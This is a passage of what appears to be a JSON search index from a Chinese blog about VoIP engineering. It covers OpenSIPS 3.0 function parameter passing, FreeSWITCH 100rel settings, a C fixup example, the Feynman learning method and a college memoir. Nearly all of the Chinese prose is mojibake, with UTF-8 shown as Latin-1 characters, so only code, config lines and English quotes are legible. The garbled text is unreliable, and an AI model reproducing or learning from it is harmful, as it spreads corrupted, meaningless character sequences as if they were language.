çš„è¯­è¨€ï¼Œç›®çš„æ˜¯ç”¨ä½ è‡ªå·±çš„è¯­è¨€ï¼Œè§£é‡ŠæŸä¸ªæ¦‚å¿µï¼Œå¦‚æœä½ ä¾ç„¶è¿˜æ˜¯æœ‰äº›å›°æƒ‘ï¼Œé‚£è¯´æ˜ä½ è¿˜æ˜¯ä¸å¤Ÿäº†è§£è¿™ä¸ªæ¦‚å¿µã€‚ è´¹æ›¼æ›¾è·å¾—è¯ºè´å°”å¥–ï¼Œæ‰€ä»¥ä¸Šä»–ä¸æ˜¯ä¸ªç®€å•çš„äººã€‚è´¹æ›¼çš„è€å¸ˆå«æƒ å‹’ï¼Œè´¹æ›¼çš„å­¦ä¹ æ–¹æ³•å¾ˆå¯èƒ½æ”¶åˆ°æƒ å‹’çš„å½±å“ã€‚\næƒ å‹’å¸¸å¸¸è¯´ï¼šäººåªæœ‰æ•™åˆ«äººçš„æ—¶å€™ï¼Œæ‰èƒ½å­¦åˆ°æ›´å¤šã€‚\nAnother favorite Wheelerism is \u0026ldquo;one can only learn by teaching. æƒ å‹’ä¸»ä¹‰\næƒ å‹’è¿˜æœ‰ä¸€å¥åè¨€ï¼š\nå»æ¨å°±æ˜¯æ˜¯å­¦ä¹ ï¼Œå»å­¦ä¹ æ˜¯å»ç†è§£ï¼Œå»ç†è§£æ˜¯å»æ¬£èµï¼Œå»æ¬£èµåˆ™æ˜¯å»çˆ±ï¼Œä¹Ÿè®¸ä½ ä¼šçˆ±ä¸Šä½ çš„ç†è®ºã€‚ï¼Œ\nTo hate is to study, to study is to understand, to understand is to appreciate, to appreciate is to love. So maybe I\u0026rsquo;ll end up loving your theory.","title":"ä»/bin/shåˆ°è´¹æ›¼å­¦ä¹ æ³•"},{"content":"å†™è¿‡opensipsè„šæœ¬çš„åŒå­¦ï¼Œå¾€å¾€å¯¹å‡½æ•°çš„ä¼ å‚æ„Ÿåˆ°å›°æƒ‘ã€‚\nä¾‹å¦‚ï¼š\nds_select_dst()å¯ä»¥æ¥å—æ•´æ•°æˆ–è€…å€¼ä¸ºæ­£æ•°çš„å˜é‡ä½œä¸ºç¬¬ä¸€ä¸ªå‚æ•°ï¼Œä½†æ˜¯nat_uac_test()çš„ç¬¬ä¸€ä¸ªå‚æ•°å°±åªèƒ½æ˜¯æ•´æ•°ï¼Œè€Œä¸èƒ½æ˜¯å˜é‡ ä¸ºä»€ä¹ˆrl_check()å¯ä»¥æ¥å—æ ¼å¼åŒ–çš„å­—ç¬¦ä¸²ï¼Œè€Œsave()åªèƒ½æ¥å—å­—ç¬¦ä¸²ã€‚ ä¸ºä»€ä¹ˆds_select_dst(\u0026quot;1\u0026quot;, \u0026quot;4\u0026quot;) ä½œä¸ºæ•´æ•°ä¹Ÿè¦åŠ ä¸ŠåŒå¼•å·ï¼Ÿ ä¸ºä»€ä¹ˆå˜é‡è¦åŠ ä¸ŠåŒå¼•å·ï¼Ÿ ds_select_dst(\u0026quot;$var(aa)\u0026quot;, \u0026quot;4\u0026quot;) ä¸ºä»€ä¹ˆt_on_branch(\u0026quot;1\u0026quot;)è·¯ç”±çš„é’©å­è¦åŠ ä¸ŠåŒå¼•å·ï¼Ÿ ä¸ºä»€ä¹ˆroute(go_to_something);è¿™é‡Œåˆä¸éœ€è¦åŠ ä¸Šå¼•å·ï¼Ÿ ds_select_dst(\u0026#34;1\u0026#34;, \u0026#34;0\u0026#34;); $var(aa)=1; ds_select_dst(\u0026#34;$var(aa)\u0026#34;, \u0026#34;0\u0026#34;); rl_check(\u0026#34;gw_$ru\u0026#34;, \u0026#34;$var(limit)\u0026#34;); #æ ¼å¼åŒ–çš„gw_$ru save(\u0026#34;location\u0026#34;); #å•çº¯çš„å­—ç¬¦ä¸²ä½œä¸ºå‚æ•° ä»3.0å¼€å§‹ï¼Œä¼ å‚å¯ä»¥æ›´åŠ è‡ªç„¶ã€‚\næ•´æ•°å¯ä»¥ç›´æ¥ä¼ å‚ï¼Œä¸ç”¨åŠ åŒå¼•å· do_something(1, 1); è¾“å…¥æˆ–è€…è¾“å‡ºçš„$var(), ä¸ç”¨åŠ åŒå¼•å·ï¼ŒåŠ äº†åè€Œä¼šæŠ¥é”™ do_something($var(a), $var(b)); æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œéœ€è¦åŠ åŒå¼•å· do_something(1, \u0026#34;$var(bb)_$var(b)\u0026#34;); å‚è€ƒ https://blog.opensips.org/2019/11/05/the-module-function-interface-rework-in-opensips-3-0/ https://www.opensips.org/Documentation/Script-Syntax-3-0# ","permalink":"https://wdd.js.org/opensips/ch8/fork/","summary":"å†™è¿‡opensipsè„šæœ¬çš„åŒå­¦ï¼Œå¾€å¾€å¯¹å‡½æ•°çš„ä¼ å‚æ„Ÿåˆ°å›°æƒ‘ã€‚\nä¾‹å¦‚ï¼š\nds_select_dst()å¯ä»¥æ¥å—æ•´æ•°æˆ–è€…å€¼ä¸ºæ­£æ•°çš„å˜é‡ä½œä¸ºç¬¬ä¸€ä¸ªå‚æ•°ï¼Œä½†æ˜¯nat_uac_test()çš„ç¬¬ä¸€ä¸ªå‚æ•°å°±åªèƒ½æ˜¯æ•´æ•°ï¼Œè€Œä¸èƒ½æ˜¯å˜é‡ ä¸ºä»€ä¹ˆrl_check()å¯ä»¥æ¥å—æ ¼å¼åŒ–çš„å­—ç¬¦ä¸²ï¼Œè€Œsave()åªèƒ½æ¥å—å­—ç¬¦ä¸²ã€‚ ä¸ºä»€ä¹ˆds_select_dst(\u0026quot;1\u0026quot;, \u0026quot;4\u0026quot;) ä½œä¸ºæ•´æ•°ä¹Ÿè¦åŠ ä¸ŠåŒå¼•å·ï¼Ÿ ä¸ºä»€ä¹ˆå˜é‡è¦åŠ ä¸ŠåŒå¼•å·ï¼Ÿ ds_select_dst(\u0026quot;$var(aa)\u0026quot;, \u0026quot;4\u0026quot;) ä¸ºä»€ä¹ˆt_on_branch(\u0026quot;1\u0026quot;)è·¯ç”±çš„é’©å­è¦åŠ ä¸ŠåŒå¼•å·ï¼Ÿ ä¸ºä»€ä¹ˆroute(go_to_something);è¿™é‡Œåˆä¸éœ€è¦åŠ ä¸Šå¼•å·ï¼Ÿ ds_select_dst(\u0026#34;1\u0026#34;, \u0026#34;0\u0026#34;); $var(aa)=1; ds_select_dst(\u0026#34;$var(aa)\u0026#34;, \u0026#34;0\u0026#34;); rl_check(\u0026#34;gw_$ru\u0026#34;, \u0026#34;$var(limit)\u0026#34;); #æ ¼å¼åŒ–çš„gw_$ru save(\u0026#34;location\u0026#34;); #å•çº¯çš„å­—ç¬¦ä¸²ä½œä¸ºå‚æ•° ä»3.0å¼€å§‹ï¼Œä¼ å‚å¯ä»¥æ›´åŠ è‡ªç„¶ã€‚\næ•´æ•°å¯ä»¥ç›´æ¥ä¼ å‚ï¼Œä¸ç”¨åŠ åŒå¼•å· do_something(1, 1); è¾“å…¥æˆ–è€…è¾“å‡ºçš„$var(), ä¸ç”¨åŠ åŒå¼•å·ï¼ŒåŠ äº†åè€Œä¼šæŠ¥é”™ do_something($var(a), $var(b)); æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œéœ€è¦åŠ åŒå¼•å· do_something(1, \u0026#34;$var(bb)_$var(b)\u0026#34;); å‚è€ƒ https://blog.opensips.org/2019/11/05/the-module-function-interface-rework-in-opensips-3-0/ https://www.opensips.org/Documentation/Script-Syntax-3-0# ","title":"æ¨¡å—ä¼ å‚çš„é‡æ„"},{"content":" sbc_100rel.pdf\nåœ¨fsä¸­é…ç½®ï¼š\nenable-100rel è®¾ç½®ä¸ºtrue âœ fs-conf ack 100rel sip_profiles/internal.xml 112: There are known issues (asserts and segfaults) when 100rel is enabled. 113: It is not recommended to enable 100rel at this time. 115: \u0026lt;!--\u0026lt;param name=\u0026#34;enable-100rel\u0026#34; value=\u0026#34;true\u0026#34;/\u0026gt;--\u0026gt; sip_profiles/external-ipv6.xml 36: \u0026lt;!--\u0026lt;param name=\u0026#34;enable-100rel\u0026#34; value=\u0026#34;true\u0026#34;/\u0026gt;--\u0026gt; sip_profiles/internal-ipv6.xml 27: \u0026lt;!--\u0026lt;param name=\u0026#34;enable-100rel\u0026#34; value=\u0026#34;false\u0026#34;/\u0026gt;--\u0026gt; sip_profiles/external.xml 36: \u0026lt;!--\u0026lt;param name=\u0026#34;enable-100rel\u0026#34; value=\u0026#34;true\u0026#34;/\u0026gt;--\u0026gt; enable-100rel This enable support for 100rel (100% reliability - PRACK message as defined inRFC3262) This fixes a problem with SIP where provisional messages like \u0026ldquo;180 Ringing\u0026rdquo; are not ACK\u0026rsquo;d and therefore could be dropped over a poor connection without retransmission. 2009-07-08: Enabling this may cause FreeSWITCH to crash, seeFSCORE-392.\nå‚è€ƒ http://lists.freeswitch.org/pipermail/freeswitch-users/2018-April/129473.html https://freeswitch.org/confluence/display/FREESWITCH/Sofia+Configuration+Files https://tools.ietf.org/html/draft-ietf-sip-100rel-02 https://nickvsnetworking.com/sip-extensions-100rel-sip-rfc3262/ ","permalink":"https://wdd.js.org/opensips/ch9/100-rel/","summary":"sbc_100rel.pdf\nåœ¨fsä¸­é…ç½®ï¼š\nenable-100rel è®¾ç½®ä¸ºtrue âœ fs-conf ack 100rel sip_profiles/internal.xml 112: There are known issues (asserts and segfaults) when 100rel is enabled. 113: It is not recommended to enable 100rel at this time. 115: \u0026lt;!--\u0026lt;param name=\u0026#34;enable-100rel\u0026#34; value=\u0026#34;true\u0026#34;/\u0026gt;--\u0026gt; sip_profiles/external-ipv6.xml 36: \u0026lt;!--\u0026lt;param name=\u0026#34;enable-100rel\u0026#34; value=\u0026#34;true\u0026#34;/\u0026gt;--\u0026gt; sip_profiles/internal-ipv6.xml 27: \u0026lt;!--\u0026lt;param name=\u0026#34;enable-100rel\u0026#34; value=\u0026#34;false\u0026#34;/\u0026gt;--\u0026gt; sip_profiles/external.xml 36: \u0026lt;!--\u0026lt;param name=\u0026#34;enable-100rel\u0026#34; value=\u0026#34;true\u0026#34;/\u0026gt;--\u0026gt; enable-100rel This enable support for 100rel (100% reliability - PRACK message as defined inRFC3262) This fixes a problem with SIP where provisional messages like \u0026ldquo;180 Ringing\u0026rdquo; are not ACK\u0026rsquo;d and therefore could be dropped over a poor connection without retransmission.","title":"sbc 100rel"},{"content":"å‡å¦‚ä¸€ä¸ªæ¨¡å—æš´éœ²äº†ä¸€ä¸ªå‡½æ•°ï¼Œå«åšdo_something(), ä»…æ”¯æŒä¼ é€’ä¸€ä¸ªå‚æ•°ã€‚è¿™ä¸ªå‡½æ•°åœ¨cæ–‡ä»¶ä¸­å¯¹åº”w_do_something()\n// åœ¨opensips.cfgæ–‡ä»¶ä¸­ route{ do_something(\u0026#34;abc\u0026#34;) } static int w_do_something(struct sip_msg* msg, char* str1){ // åœ¨cæ–‡ä»¶ä¸­ï¼Œæˆ‘ä»¬æ‰“å°str1çš„å€¼ï¼Œè¿™ä¸ªå­—ç¬¦ä¸²å°±æ˜¯abc } // åœ¨opensips.cfgæ–‡ä»¶ä¸­ route{ $var(num)=\u0026#34;abc\u0026#34;; do_something(\u0026#34;$var(num)\u0026#34;) } static int w_do_something(struct sip_msg* msg, char* str1){ // åœ¨cæ–‡ä»¶ä¸­ï¼Œæˆ‘ä»¬æ‰“å°str1çš„å€¼ï¼Œè¿™ä¸ªå­—ç¬¦ä¸²å°±æ˜¯$var(num) // è¿™æ—¶å€™å°±æœ‰é—®é¢˜äº†ï¼Œå…¶å®æˆ‘ä»¬æƒ³è·å–çš„æ˜¯$var(num)çš„å€¼abc, è€Œä¸æ˜¯å­—ç¬¦ä¸²$var(num) } é‚£æ€ä¹ˆè·å–$var()çš„ä¼ å‚çš„å€¼å‘¢ï¼Ÿè¿™é‡Œå°±éœ€è¦ç”¨åˆ°äº†å‡½æ•°çš„fixup_å‡½æ•°ã€‚\nstatic cmd_export_t cmds[]={ {\u0026#34;find_zone_code\u0026#34;, (cmd_function)w_do_something, 2, fixup_do_something, 0, REQUEST_ROUTE}, {0,0,0,0,0,0} }; // è°ƒç”¨fixup_spveï¼Œ åªæœ‰åœ¨fixupå‡½æ•°ä¸­ï¼Œå¯¹å‡½æ•°çš„å‚æ•°æ‰§è¡Œäº†fixup, åœ¨çœŸæ­£çš„æ‰§è¡Œå‡½æ•°ä¸­ï¼Œæ‰èƒ½å¾—åˆ°çœŸæ­£çš„$var()çš„å€¼ static int fixup_do_something(void** param, int param_no) { LM_INFO(\u0026#34;fixup_find_zone_code: param: %s param_no: %d\\n\u0026#34;, (char *)*param, param_no); return fixup_spve(param); } static int w_do_something (struct sip_msg* msg, char* str1){ str zone; if (fixup_get_svalue(msg, (gparam_p)str1, \u0026amp;zone) != 0) { LM_WARN(\u0026#34;cannot find the phone!\\n\u0026#34;); return -1; } LM_INFO(\u0026#34;zone:%s\\n\u0026#34;, zone.s); return 1; } ","permalink":"https://wdd.js.org/opensips/module-dev/l4-3/","summary":"å‡å¦‚ä¸€ä¸ªæ¨¡å—æš´éœ²äº†ä¸€ä¸ªå‡½æ•°ï¼Œå«åšdo_something(), ä»…æ”¯æŒä¼ é€’ä¸€ä¸ªå‚æ•°ã€‚è¿™ä¸ªå‡½æ•°åœ¨cæ–‡ä»¶ä¸­å¯¹åº”w_do_something()\n// åœ¨opensips.cfgæ–‡ä»¶ä¸­ route{ do_something(\u0026#34;abc\u0026#34;) } static int w_do_something(struct sip_msg* msg, char* str1){ // åœ¨cæ–‡ä»¶ä¸­ï¼Œæˆ‘ä»¬æ‰“å°str1çš„å€¼ï¼Œè¿™ä¸ªå­—ç¬¦ä¸²å°±æ˜¯abc } // åœ¨opensips.cfgæ–‡ä»¶ä¸­ route{ $var(num)=\u0026#34;abc\u0026#34;; do_something(\u0026#34;$var(num)\u0026#34;) } static int w_do_something(struct sip_msg* msg, char* str1){ // åœ¨cæ–‡ä»¶ä¸­ï¼Œæˆ‘ä»¬æ‰“å°str1çš„å€¼ï¼Œè¿™ä¸ªå­—ç¬¦ä¸²å°±æ˜¯$var(num) // è¿™æ—¶å€™å°±æœ‰é—®é¢˜äº†ï¼Œå…¶å®æˆ‘ä»¬æƒ³è·å–çš„æ˜¯$var(num)çš„å€¼abc, è€Œä¸æ˜¯å­—ç¬¦ä¸²$var(num) } é‚£æ€ä¹ˆè·å–$var()çš„ä¼ å‚çš„å€¼å‘¢ï¼Ÿè¿™é‡Œå°±éœ€è¦ç”¨åˆ°äº†å‡½æ•°çš„fixup_å‡½æ•°ã€‚\nstatic cmd_export_t cmds[]={ {\u0026#34;find_zone_code\u0026#34;, (cmd_function)w_do_something, 2, fixup_do_something, 0, REQUEST_ROUTE}, {0,0,0,0,0,0} }; // è°ƒç”¨fixup_spveï¼Œ åªæœ‰åœ¨fixupå‡½æ•°ä¸­ï¼Œå¯¹å‡½æ•°çš„å‚æ•°æ‰§è¡Œäº†fixup, åœ¨çœŸæ­£çš„æ‰§è¡Œå‡½æ•°ä¸­ï¼Œæ‰èƒ½å¾—åˆ°çœŸæ­£çš„$var()çš„å€¼ static int fixup_do_something(void** param, int param_no) { LM_INFO(\u0026#34;fixup_find_zone_code: param: %s param_no: %d\\n\u0026#34;, (char *)*param, param_no); return fixup_spve(param); } static int w_do_something (struct sip_msg* msg, char* str1){ str zone; if (fixup_get_svalue(msg, (gparam_p)str1, \u0026amp;zone) !","title":"ch4-3 $var() ç±»å‹çš„ä¼ å‚"},{"content":"2012å¹´ï¼Œæˆ‘ä»å®‰å¾½çš„ä¸€ä¸ªå°åŸå¸‚è€ƒåˆ°ä¸Šæµ·ï¼Œå‰å¾€ä¸€ä¸ªæ™®é€šçš„äºŒæœ¬é™¢æ ¡ä¸Šå¤§å­¦ï¼Œå­¦ä¹ ç½‘ç»œå·¥ç¨‹ã€‚\nåœ¨å¾ˆå¤šäººä»¥ä¸ºï¼Œä¸Šå¤§å­¦ä¸å°±æ˜¯ç©å—ï¼Ÿå…¶å®ä¹ŸåŸºæœ¬å±å®ï¼Œç‰¹åˆ«æ˜¯åƒæˆ‘ä»¬è¿™ç§æ™®é€šçš„å­¦æ ¡ã€‚ä½†æ˜¯æˆ‘çš„å¤§å­¦ä¹Ÿå¹¶æ²¡æœ‰è’åºŸï¼Œè¿™å…¶å®ä¹Ÿå¹¶ä¸æ˜¯è¯´æ˜æˆ‘å°±å¤šä¼˜ç§€ã€‚ è¿™å…¶ä¸­çš„åŸå› ï¼Œè¯´æ¥ä¹Ÿæ˜¯è›®æœ‰æ„æ€ã€‚æˆ‘æ‰“æ¸¸æˆå¤ªèœï¼Œè€Œä¸”å¿ƒç†ç´ è´¨ä¸å¥½ï¼Œä¸”åˆæ²¡æœ‰åšæŒä¸æ‡ˆçš„æ¯…åŠ›ã€‚æ‰€ä»¥æˆ‘å°±æ—©æ—©çš„æ”¾å¼ƒäº†è‹±é›„è”ç›Ÿè¿™ç§æ¸¸æˆã€‚\nä¸€ä¸ªå¤§å­¦ç”Ÿï¼Œä¸€æ—¦æ”¾å¼ƒäº†æ‰“æ¸¸æˆï¼Œå…¶å®ä»–å°±å‰©ä½™äº†å¾ˆå¤šç©ºä½™çš„æ—¶é—´ã€‚å¤šä½™çš„æ—¶é—´èƒ½å¹²ç”Ÿä¹ˆå‘¢ï¼Ÿ\né€‰æ‹©ä¸å¤šã€‚1. å¯ä»¥é€‰æ‹©è°ˆè°ˆæ‹çˆ±ã€‚ä½†æ˜¯ä¸€æ¥æˆ‘å›Šä¸­ç¾æ¶©ï¼Œè€Œæ¥ä¹Ÿæ²¡æœ‰ä»€ä¹ˆé•¿å¾—æ¯”è¾ƒæ¼‚äº®ï¼Œä¸€è§é’Ÿæƒ…çš„å¥³ç”Ÿã€‚æ‰€ä»¥è°ˆæ‹çˆ±è¿™äº‹å°±æ”¾ä¸‹äº†ã€‚ å‰©ä¸‹çš„é€‰æ‹©ä¾¿åªæœ‰ä¸€ä¸ªï¼Œå­¦ä¹ ã€‚\nå¯¹äº†ï¼Œå°±æ˜¯å­¦ä¹ ã€‚å½“å…¶ä»–äººéƒ½é€‰æ‹©æ¸¸æˆå¨±ä¹çš„æ—¶å€™ï¼Œä½ ç¨å¾®ç”¨ç‚¹åŠ›ï¼Œå°±èƒ½æ¯”å¾ˆå¤šäººä¼˜ç§€ã€‚\nä¸‹ä¸€ä¸ªé—®é¢˜å°±æ˜¯å­¦ä¹ ã€‚ å­¦ä¹ è¦æœ‰å…´è¶£ï¼Œå¹¶ä¸”è¦å†³å®šå­¦ä»€ä¹ˆã€‚\nè¿™ç§æ—¶å€™ï¼Œæˆ‘æ€æ½®åˆè½å…¥å›å¿†ä¸­ï¼Œä¼¼ä¹å¿˜è®°çš„äº‹æƒ…ï¼Œæ­¤åˆ»åˆæ¸…æ™°æƒ³èµ·æ¥ã€‚\né‚£æ˜¯æˆ‘åˆä¸‰æš‘å‡çš„æ—¶å€™ï¼Œå‚åŠ è¿‡ä¸€æ¬¡å­¦æ ¡ç»„ç»‡çš„è®¡ç®—æœºå…è´¹åŸ¹è®­è¯¾ç¨‹ï¼Œå…¶ä¸­åŸ¹è®­äº†å¾ˆå¤šä¸œè¥¿ã€‚åƒäº”ç¬”æ‰“å­—ã€åˆ¶ä½œflashã€å­¦ä¹ photoshopä¹‹ç±»çš„ã€‚ä¸Šè¯¾è€å¸ˆåœ¨è¯¾å ‚ä¸Šè¯´è¿‡ï¼ŒåŸ¹è®­ç»“æŸçš„æ—¶å€™ï¼Œä¼šé€‰æ‹©å‡ ä¸ªæˆç»©ä¼˜å¼‚çš„å­¦ç”Ÿï¼Œç»™äºˆå‡ ç™¾å—çš„å¥–åŠ±ã€‚ä¸ºäº†è¿™å‡ ç™¾å—çš„å¥–åŠ±ï¼Œæˆ‘ä¹Ÿä¸èƒ½é€€ç¼©ï¼Œæˆ‘å¾ˆå¿«è®°ä½äº†äº”ç¬”è¯æ ¹ã€‚ç„¶ååœ¨è¯¾å ‚ä¸Šï¼Œæˆ‘åœ¨ä¼—åŒå­¦ä½©æœçš„çœ¼å…‰ä¸­ï¼ŒæŠŠäº”ç¬”å­—æ ¹å…¨éƒ¨èƒŒäº†ä¸€éç»™è€å¸ˆå¬ã€‚\nå­¦ä¹ çš„å†…å®¹ä¸­ï¼ŒphotoshopçœŸå®ç»™æˆ‘æ‰“å¼€äº†ä¸€ä¸ªé€šå¾€ç¥ç§˜ä¸–ç•Œçš„å¤§é—¨ï¼ŒåŸæ¥ç”µè„‘è¿˜èƒ½åšè¿™ä¹ˆç‰›é€¼çš„äº‹æƒ…ã€‚æ¥ä¸‹æ¥ç»è¿‡æˆ‘åºŸå¯å¿˜é£Ÿï¼Œä¸“å¿ƒè‡´å¿—ï¼Œä¸€ä¸ä¸è‹Ÿçš„å­¦ä¹ ï¼Œæˆ‘å·²ç»çŸ¥é“äº†ä¸€äº›åŸºæœ¬çš„å›¾ç‰‡åˆ¶ä½œæŠ€å·§ã€‚åˆ©ç”¨è¿™ä¸ªæŠ€å·§ï¼Œæˆ‘åšäº†å¾ˆå¤šæç¬‘çš„å›¾ç‰‡ï¼Œjust for fun!\nç„¶è€Œç›´åˆ°æš‘å‡ç»“æŸï¼Œå¾ˆå¤šåŒå­¦å¿ƒå¿ƒå¿µå¿µçš„å‡ ç™¾å—å¥–åŠ±ï¼Œè®²è¯¾è€å¸ˆåœ¨ä¹Ÿæ²¡æœ‰æè¿‡ã€‚\næˆ‘æƒ³ï¼Œæœ‰äº†åˆä¸­çš„psç»éªŒï¼Œå†µä¸”æˆ‘å¯¹è¿™ä¸œè¥¿å¾ˆæ„Ÿå…´è¶£ã€‚æ‰€ä»¥æˆ‘å°±ä»æ·˜å®ä¸Šæ¢äº†å‡ åå—é’±ï¼Œä¹°äº†ä¸€æœ¬å¾ˆåšçš„ï¼Œè®²è§£photoshopçš„ä¹¦ã€‚æŒ‰ç…§ä¹¦ä¸­çš„æŒ‡å¯¼ï¼Œæˆ‘å¯¹photoshopæœ‰äº†å…¨é¢ç³»ç»Ÿçš„å­¦ä¹ ï¼Œç„¶ååˆè·Ÿç€å®æˆ˜ï¼Œå­¦ä¼šäº†å¾ˆå¤šå…³äºæŠ å›¾ã€ç¾å®¹ã€ç‰¹æ•ˆçš„æŠ€æœ¯ã€‚è™½ç„¶æˆ‘å­¦äº†photoshopï¼Œä½†æ˜¯æ„Ÿè§‰ä¸Šå¹¶æ²¡æœ‰ä»€ä¹ˆç”¨ï¼Œå› ä¸ºè€ƒè¯•åˆä¸è€ƒphotoshop, æ‰€ä»¥æˆ‘åªèƒ½è‡ªå·±é€šè¿‡åˆ¶ä½œä¸€äº›æç¬‘å›¾ç‰‡æ¥è‡ªå¨±è‡ªä¹ã€‚\nç„¶è€Œï¼Œä¸€æ—¦ä½ å­¦ä¼šæŸä¸ªä¸œè¥¿ï¼Œä¾¿çœŸçš„æœ‰æ´¾ä¸Šç”¨åœºçš„æ—¶å€™ã€‚å¤§å››å¿«æ¯•ä¸šæ—¶ï¼Œå¾ˆå¤šåŒå­¦å¼€å§‹æç®€å†ï¼Œç®€å†ä¸Šä¸€èˆ¬è¦è´´ç…§ç‰‡çš„ã€‚æ‰€ä»¥æˆ‘ä¾¿æˆä¸ºäº†ç­çº§é‡Œè¿œè¿‘é—»åçš„ä¿®å›¾å¤§å¸ˆã€‚\né™¤äº†photoshopï¼Œä¸“ä¸šè¯¾ä¸Šå¯ä»¥è¯´çš„å°±æ˜¯å­¦ä¹ ç¼–ç¨‹äº†ã€‚å½“æ—¶æˆ‘cè¯­è¨€å­¦çš„éå¸¸å¥½ï¼Œæˆè¯¾è€å¸ˆç»å¸¸åœ¨è¯¾å ‚ä¸Šææˆ‘æ¥å›ç­”é—®é¢˜ã€‚ä¸ºäº†é¿å…å›ç­”ä¸ä¸Šæ¥é—®é¢˜ï¼Œæ˜¾å¾—å¾ˆæ²¡é¢å­ã€‚æˆ‘ç»å¸¸åœ¨ä¸Šè¯¾ä¹‹å‰å·å·çš„å°±é¢„ä¹ ä¸Šè¯¾çš„å†…å®¹ï¼Œå¹¶ä¸”å­¦ä¹ å¦‚ä½•è§£ç­”è¯¾åçš„ä¹ é¢˜ã€‚æ‰€ä»¥è€å¸ˆçš„æé—®æˆ‘ç»å¸¸å¯ä»¥è½»æ¾çš„å›ç­”ã€‚è€å¸ˆä¼¼ä¹æˆ‘è§‰å¾—æˆ‘æ˜¯ä¸ªå¯è‚²ä¹‹æ‰ï¼Œç»å¸¸åœ¨å…¶ä»–ç­çº§ä¸Šè¯¾çš„æ—¶å€™ï¼Œä¹Ÿä¼šåœ¨è¯¾ä¸Šææˆ‘çš„åå­—ï¼Œè¯´ï¼šå…¶ä»–ç­çš„ç‹xxåŒå­¦ï¼Œä»–è¿™ä¸ªé—®é¢˜å›ç­”çš„å¾ˆå¥½ã€‚æ‰€ä»¥ä¸€äº›å…¶ä»–ç­çº§çš„åŒå­¦ï¼Œä¹Ÿæ˜¯çŸ¥é“æˆ‘çš„åå­—çš„ã€‚\næ¯æ¯åˆ°è€ƒè¯•ä¹‹å‰ï¼Œæˆ‘æ€»ä¼šæ”¶åˆ°ä¸å°‘åŠ æˆ‘QQå¥½å‹çš„ç”³è¯·ï¼Œç„¶åé—®æˆ‘æœ‰æ²¡æœ‰æ—¶é—´ï¼Œæƒ³æ‰¾æˆ‘å¸®ä»–ä»¬å¤ä¹ cè¯­è¨€ã€‚ç„¶åå¸¦ä¸Šé¥®æ–™ï¼Œçº¦æˆ‘åˆ°å›¾ä¹¦é¦†ï¼Œå½“é¢ä¼ é“æˆä¸šè§£æƒ‘ã€‚æˆ‘è¿˜è®°å¾—ä¸€ä¸ªæ¯”è¾ƒå¥‡è‘©çš„è€å¸ˆï¼Œç»™åŒå­¦å¸ƒç½®ä½œä¸šï¼Œè¦æ±‚å®ç°æŸæŸåŠŸèƒ½ï¼Œè‡³å°‘è¦æ±‚è¦æœ‰ä¸‰åƒè¡Œä»£ç ï¼Œç„¶åè¯¥åŒå­¦ä¸œæ‹¼è¥¿å‡‘ï¼Œä¹Ÿåªå‡‘å¤Ÿäº†å¿«ä¸€åƒè¡Œï¼Œç„¶åæ‰¾æˆ‘å¸®å¿™ã€‚\nå¯ä»¥å‚è€ƒï¼š\nå¤§äºŒçš„æš‘å‡ï¼Œæˆ‘ä»¬æ¬äº†æ ¡åŒºã€‚ä»è¿œç¦»å¸‚åŒºçš„æ–°æ ¡åŒºï¼Œæ¬åˆ°äº†ç¦»å¸‚åŒºæ¯”è¾ƒè¿‘çš„è€æ ¡åŒºã€‚\nå¿«æ”¾å‡äº†ï¼Œæœ‰ä¸å°‘çš„åŒå­¦å†³å®šæš‘å‡ç•™æ ¡ï¼Œç„¶åæ‰¾ç‚¹å·¥ä½œï¼Œèµšç‚¹é›¶èŠ±é’±ã€‚\næˆ‘ä¹Ÿè§‰å¾—æ”¾å‡å›å®¶æ²¡æ„æ€ï¼Œå†³å®šæš‘å‡æ‰¾å·¥ä½œã€‚å› ä¸ºæˆ‘æœ‰ä¸€äº›photoshopçš„åŸºç¡€ï¼Œæ‰€ä»¥å°±åœ¨æ‹›è˜ç½‘ç«™ä¸Šå†™è‡ªå·±ç²¾é€šphotoshopï¼Œçœ‹çœ‹æœ‰æ²¡æœ‰äººéœ€è¦ã€‚å¾ˆå¿«æˆ‘æ‰¾åˆ°äº†ä¸€ä»½å·¥ä½œï¼Œç„¶è€Œåˆšå¼€å§‹çš„å·¥ä½œå¹¶ä¸æ˜¯å›¾ç‰‡åˆ¶ä½œï¼Œè€Œæ˜¯æ‘„å½±æ‘„åƒã€‚å…·ä½“çš„å†…å®¹æ˜¯ç»™å¤ç©è‰ºæœ¯å“æ‹ç…§ï¼Œç„¶åæˆ‘å°±ä¸€è¾¹å­¦ä¹ ä¸€è¾¹æ‹ç…§ï¼Œç…§ç‰‡æ‹å®Œè¿˜è¦ç”¨psåšåæœŸå¤„ç†ã€‚æ‰€ä»¥æ•´ä¸ªæš‘å‡ï¼ŒåŒ…æ‹¬å¤§ä¸‰ï¼Œå’Œå¤§å››ã€‚æˆ‘åŸºæœ¬ä¸Šéƒ½åœ¨å’Œå¤ç©è‰ºæœ¯å“æ‰“äº¤é“ï¼Œè§è¯†äº†ä¸å°‘çš„å®è´ã€‚ä»ä¹¦ç”»ï¼Œåˆ°ç´«ç ‚å£¶ï¼Œç‰å™¨ï¼Œé™¶å™¨ï¼Œæ‰‹å·¥è‰ºå“ç­‰ç­‰ï¼Œéƒ½æœ‰æ¥è§¦ã€‚ä¸Šæµ·çš„å„å¤§å¤ç©åŸï¼Œæˆ‘ä¹ŸåŸºæœ¬éƒ½è·‘è¿‡å¥½å‡ éã€‚ä¹Ÿç»„ç»‡è¿‡ä¸€æ¬¡å°å‹çš„æ‹å–ä¼šï¼Œä¸»è¦è´Ÿè´£æ‹å–å›¾å†Œçš„åˆ¶ä½œã€‚\næˆ‘çš„å¤§ä¸‰å’Œå¤§å››æ—¶å¾ˆå¿™çš„ï¼Œå€’ä¸æ˜¯å­¦ä¹ ï¼Œè€Œæ˜¯è¯¾å¤–çš„å·¥ä½œã€‚å·¥ä½œå¾ˆç´¯ï¼Œæ¯æ™šåŸºæœ¬ä¸Šéƒ½æ˜¯9ç‚¹ä»¥åä¸‹ç­ï¼Œå›åˆ°å­¦æ ¡å°±åŸºæœ¬ä¸Š10ç‚¹å·¦å³ã€‚æœ‰æ—¶å€™å› 